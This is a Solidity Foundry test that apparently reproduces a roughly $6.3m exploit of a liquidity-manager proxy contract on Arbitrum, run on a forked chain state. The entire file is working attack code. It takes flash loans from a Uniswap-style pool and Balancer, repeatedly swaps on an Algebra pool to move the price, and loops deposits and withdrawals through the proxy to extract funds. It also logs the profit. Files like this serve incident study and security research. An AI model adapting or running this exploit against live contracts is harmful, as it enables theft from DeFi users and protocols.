// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.22;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : ~$6.3m
// Attacker : 0x5351536145610aa448a8bf85ba97c71caf31909c
// Attack Contract : 0xfd42cba85f6567fef32bab24179de21b9851b63e
// Vulnerable Contract : 0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E
// Attack Tx : https://arbiscan.io/tx/0x025cf2858723369d606ee3abbc4ec01eab064a97cc9ec578bf91c6908679be75

// @Info
// Vulnerable Contract Code : https://arbiscan.io/address/0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E#code

// @Analysis
// Twitter alert by Officer's Notes : https://twitter.com/officer_cia/status/1742772207997050899
// Twitter alert by shouc / BlockSec: https://twitter.com/shoucccc/status/1742765618984829326

contract ContractTest is Test {
    receive() external payable {}

    address constant uniproxy = 0x1F1Ca4e8236CD13032653391dB7e9544a6ad123E;
    address constant algebra_pool = 0x3AB5DD69950a948c55D1FBFb7500BF92B4Bd4C48;
    address constant usdt_usdce_pool =
        0x61A7b3dae70D943C6f2eA9ba4FfD2fEcc6AF15E4;
    address constant weth_usdt_pool =
        0x641C00A822e8b671738d32a431a4Fb6074E5c79d;
    address constant weth = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant balancer = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address constant weth_usdce_pool =
        0xC31E54c7a869B9FcBEcc14363CF510d1c41fa443;
    address constant usdt = 0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9;
    address constant usdce = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;

    function setUp() public {
        vm.createSelectFork("arbitrum", 166873291);
    }

    function testExploit() public {
        uint256 initial_balance = address(this).balance;
        I(usdt).approve(usdt_usdce_pool, type(uint256).max);
        I(usdce).approve(usdt_usdce_pool, type(uint256).max);
        I(weth_usdt_pool).flash(address(this), 0, 3000000000000, "");

        I(weth_usdce_pool).swap(
            address(this),
            false,
            int256(I(usdce).balanceOf(address(this))),
            4526582309038291990822582, // the price limit of the swap
            ""
        );

        // received weth and withdraw
        I(weth).withdraw(I(weth).balanceOf(address(this)));

        console.log(
            "Earned %s ETH",
            (address(this).balance - initial_balance) / 1e18
        );
    }

    function calculatePrice() internal returns (uint160) {
        I.GlobalState memory gs = I(algebra_pool).globalState();
        return (gs.price * 85572) / 100000;
    }

    function uniswapV3FlashCallback(
        uint256 v1,
        uint256 v2,
        bytes memory
    ) public {
        address[] memory arr01 = new address[](1);
        arr01[0] = usdce;
        uint256[] memory arr02 = new uint256[](1);
        arr02[0] = 2000000000000;
        I(balancer).flashLoan(address(this), arr01, arr02, "x");
        uint256 v2 = I(usdt).balanceOf(address(this)) - 3001500000000;
        I(algebra_pool).swap(
            address(this),
            true,
            473259664738,
            calculatePrice(),
            ""
        );

        // repay flash loan
        I(usdt).transfer(weth_usdt_pool, 3001500000000);
    }

    function uniswapV3SwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory
    ) public {
        I(usdce).transfer(weth_usdce_pool, uint256(amount1Delta));
    }

    function algebraSwapCallback(
        int256 amount0Delta,
        int256 amount1Delta,
        bytes memory
    ) public {
        if (amount0Delta > 0) {
            I(usdt).transfer(algebra_pool, uint256(amount0Delta));
        } else {
            I(usdce).transfer(algebra_pool, uint256(amount1Delta));
        }
    }

    function receiveFlashLoan(
        address[] memory,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) public {
        uint256[4] memory empty_arr;
        empty_arr[0] = 0;
        empty_arr[1] = 0;
        empty_arr[2] = 0;
        empty_arr[3] = 0;

        for (uint256 i = 0; i < 15; i++) {
            I(algebra_pool).swap(
                address(this),
                true,
                int256(I(usdt).balanceOf(address(this))),
                calculatePrice(),
                ""
            );

            uint256 val = I(uniproxy).deposit(
                1,
                300000000000,
                address(this),
                usdt_usdce_pool,
                empty_arr
            );

            I(usdt_usdce_pool).withdraw(
                val,
                address(this),
                address(this),
                empty_arr
            );

            I(algebra_pool).swap(
                address(this),
                false,
                int256(I(usdce).balanceOf(address(this))),
                83949998135706271822084553181,
                ""
            );
            I(uniproxy).deposit(
                1,
                1000000,
                address(this),
                usdt_usdce_pool,
                empty_arr
            );
        }
        I(algebra_pool).swap(
            address(this),
            true,
            -int256(amounts[0] - I(usdce).balanceOf(address(this))),
            calculatePrice(),
            ""
        );

        I(usdce).transfer(balancer, amounts[0]);
    }
}

interface I {
    struct GlobalState {
        uint160 price; // The square root of the current price in Q64.96 format
        int24 tick; // The current tick
        uint16 feeZto; // The current fee for ZtO swap in hundredths of a bip, i.e. 1e-6
        uint16 feeOtz; // The current fee for OtZ swap in hundredths of a bip, i.e. 1e-6
        uint16 timepointIndex; // The index of the last written timepoint
        uint8 communityFeeToken0; // The community fee represented as a percent of all collected fee in thousandths (1e-3)
        uint8 communityFeeToken1;
        bool unlocked; // True if the contract is unlocked, otherwise - false
    }

    function globalState() external view returns (GlobalState memory);

    function approve(address, uint256) external payable returns (uint256);

    function flash(address, uint256, uint256, bytes memory) external payable;

    function balanceOf(address) external payable returns (uint256);

    function flashLoan(
        address,
        address[] memory,
        uint256[] memory,
        bytes memory
    ) external payable;

    function deposit(
        uint256,
        uint256,
        address,
        address,
        uint256[4] memory
    ) external payable returns (uint256);

    function transfer(address, uint256) external payable returns (uint256);

    function withdraw(
        uint256,
        address,
        address,
        uint256[4] memory
    ) external payable;

    function withdraw(uint256) external payable;

    function swap(
        address,
        bool,
        int256,
        uint160,
        bytes memory
    ) external payable;
}
